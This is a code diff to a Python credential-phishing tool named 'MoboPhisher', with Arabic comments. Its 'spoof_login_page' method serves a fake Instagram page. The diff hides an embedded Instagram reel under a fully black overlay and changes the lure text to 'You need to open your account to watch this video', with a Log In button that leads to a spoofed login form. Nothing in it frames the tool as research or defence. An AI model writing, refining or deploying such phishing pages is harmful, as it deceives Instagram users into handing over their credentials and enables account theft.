@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو Reel + متوافقة مع Render
+# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو مسدود + متوافقة مع Render
 
 import os
 import sys
@@ -53,7 +53,7 @@ class MoboPhisher:
         conn.close()
 
     def spoof_login_page(self):
-        # هاد الصفحة كتوري فيديو إنستغرام مسدود وكتطلب تسجيل الدخول باش يتفرج
+        # هاد الصفحة كتوري فيديو إنستغرام مسدود تماماً بطبقة سوداء وكتطلب تسجيل الدخول
         return """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -87,17 +87,18 @@ class MoboPhisher:
             width: 100%;
             max-width: 400px;
             height: 600px;
-            background: #111;
+            background: #000; /* خلفية سوداء كاملة */
             border-radius: 10px;
             overflow: hidden;
             box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
-        .video-blur {
+        .video-iframe {
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            filter: blur(15px);
-            opacity: 0.6;
+            border: none;
+            position: absolute;
+            top: 0; left: 0;
+            z-index: 1; /* تحت الطبقة السوداء */
         }
         .overlay {
             position: absolute;
@@ -106,8 +107,8 @@ class MoboPhisher:
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.5);
-            z-index: 10;
+            background: #000; /* طبقة سوداء تغطي الفيديو تماماً */
+            z-index: 10; /* فوق الفيديو */
         }
         .lock-icon {
             font-size: 50px;
@@ -118,6 +119,8 @@ class MoboPhisher:
             font-weight: bold;
             margin-bottom: 20px;
             text-align: center;
+            color: #fff;
+            padding: 0 20px;
         }
         .login-btn {
             background-color: #0095F6;
@@ -175,12 +178,12 @@ class MoboPhisher:
 </head>
 <body>
     <div class="video-container">
-        <!-- فيديو إنستغرام الأصلي -->
-        <iframe class="video-blur" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
+        <!-- فيديو إنستغرام الأصلي (مخفي تحت الطبقة السوداء) -->
+        <iframe class="video-iframe" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
         
         <div class="overlay" id="overlay">
             <div class="lock-icon">🔒</div>
-            <div class="overlay-text">This video is private<br>Log in to watch</div>
+            <div class="overlay-text">You need to open your account to watch this video</div>
             <button class="login-btn" onclick="showLogin()">Log In</button>
         </div>
 
